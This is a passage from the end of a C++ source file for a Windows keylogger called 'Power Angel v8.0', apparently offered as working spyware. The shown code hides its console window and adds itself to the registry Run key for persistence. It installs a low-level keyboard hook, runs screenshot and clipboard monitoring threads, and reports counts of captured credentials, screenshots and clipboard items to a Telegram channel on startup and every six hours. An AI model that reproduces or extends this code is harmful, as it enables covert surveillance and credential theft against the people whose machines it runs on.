                            "================================\n"
                            "Screenshots: " + std::to_string(g_totalScreenshots) + "\n"
                            "Credentials: " + std::to_string(g_totalCredentials) + "\n"
                            "Clipboard: " + std::to_string(g_totalClipboards) + "\n"
                            "Active Windows: " + std::to_string(g_windowImportance.size()) + "\n"
                            "Uptime: " + std::to_string(GetTickCount() / 3600000) + " hours\n"
                            "================================\n"
                            "All Systems: ACTIVE";
        
        SendTelegramMessage(status);
        DebugLog(L"[HEARTBEAT] Status report sent");
        
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
    
    DebugLog(L"[HEARTBEAT] Heartbeat thread stopped");
}

// ==================== PERSISTENCE ====================
void InstallPersistence() {
    WCHAR path[MAX_PATH];
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) {
        DebugLog(L"[PERSISTENCE] Failed to get module path");
        return;
    }
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExW(hKey, L"PowerAngelFinal_v8", 0, REG_SZ, 
                          (BYTE*)path, (wcslen(path) + 1) * sizeof(WCHAR)) == ERROR_SUCCESS) {
            DebugLog(L"[PERSISTENCE] Added to startup: " + std::wstring(path));
        } else {
            DebugLog(L"[PERSISTENCE] Failed to set registry value");
        }
        RegCloseKey(hKey);
    } else {
        DebugLog(L"[PERSISTENCE] Failed to open registry key");
    }
}

// ==================== MAIN ====================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // Initialize
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
        return 0;
    }
    
    // Initialize logging
    DeleteFileW(L"power_angel_final.log");
    DebugLog(L"========================================");
    DebugLog(L"POWER ANGEL v8.0 - FINAL VERSION");
    DebugLog(L"Keylogger + Smart Screenshots + Clipboard");
    DebugLog(L"All bugs fixed: UTF-8 + Screenshots working");
    DebugLog(L"========================================");
    
    // Single instance check
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"Global\\PowerAngel_Final_v8.0");
    if (mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"[INIT] Another instance already running");
        GdiplusShutdown(g_gdiplusToken);
        CoUninitialize();
        return 0;
    }
    
    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Initial delay
    Sleep(10000);
    
    // Send startup notification (CLEAN TEXT - NO EMOJIS)
    std::string startupMsg = "POWER ANGEL v8.0 - FINAL VERSION STARTED\n"
                            "================================\n"
                            "Keylogger: ACTIVE\n"
                            "Smart Screenshots: ACTIVE\n"
                            "Clipboard Monitor: ACTIVE\n"
                            "All systems operational!\n"
                            "================================\n"
                            "Ready for intelligent monitoring.";
    
    SendTelegramMessage(startupMsg);
    DebugLog(L"[INIT] Startup message sent");
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"[INIT] Keyboard hook installed successfully");
    } else {
        DebugLog(L"[ERROR] Failed to install keyboard hook: " + std::to_wstring(GetLastError()));
    }
    
    // Start ALL threads
    std::thread heartbeat(HeartbeatThread);
    std::thread monitor(SmartMonitorThread);
    std::thread clipboard(ClipboardMonitorThread);
    
    DebugLog(L"[INIT] All 3 systems operational");
    
    heartbeat.detach();
    monitor.detach();
    clipboard.detach();
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    DebugLog(L"[SHUTDOWN] Final system shutting down...");
    g_running = false;
    g_queueCV.notify_one();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        DebugLog(L"[SHUTDOWN] Keyboard hook removed");
    }
    
    Sleep(2000);
    
    GdiplusShutdown(g_gdiplusToken);
    CoUninitialize();
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    DebugLog(L"[SHUTDOWN] Final system shutdown complete");
    DebugLog(L"========================================");
    
    return 0;
}
